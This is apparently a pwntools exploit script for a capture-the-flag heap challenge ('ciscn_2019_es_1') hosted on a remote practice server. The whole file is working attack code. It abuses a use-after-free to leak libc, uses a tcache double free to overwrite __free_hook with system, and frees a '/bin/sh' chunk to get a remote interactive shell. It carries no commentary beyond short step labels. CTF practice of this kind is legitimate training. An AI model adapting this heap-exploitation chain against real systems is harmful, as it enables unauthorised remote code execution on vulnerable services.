from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_2019_es_1"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29718)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con, call):
    sla("choice:", "1")
    sla("Please input the size of compary's name", str(size))
    sa("please input name:", con)
    sa("please input compary call:", call)

def show(index):
    sla("choice:", "2")
    sla("Please input the index:", str(index))

def free(index):
    sla("choice:", "3")
    sla("Please input the index:", str(index))
    

# uaf + double free

# leak libc
add(0x420, "0", "0")
add(0x10, "1", "1")
free(0)
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-0x70-libc.sym["__malloc_hook"]
print("base: ", hex(base))
free_hook = base+libc.sym["__free_hook"]
system = base+libc.sym["system"]

# alloc to free_hook
add(0x20, "2", "2")
free(2)
free(2)
add(0x20, p64(free_hook), "3")
add(0x20, "/bin/sh\x00", "4")
add(0x20, p64(system), "5")

# attack
free(4)

shell()


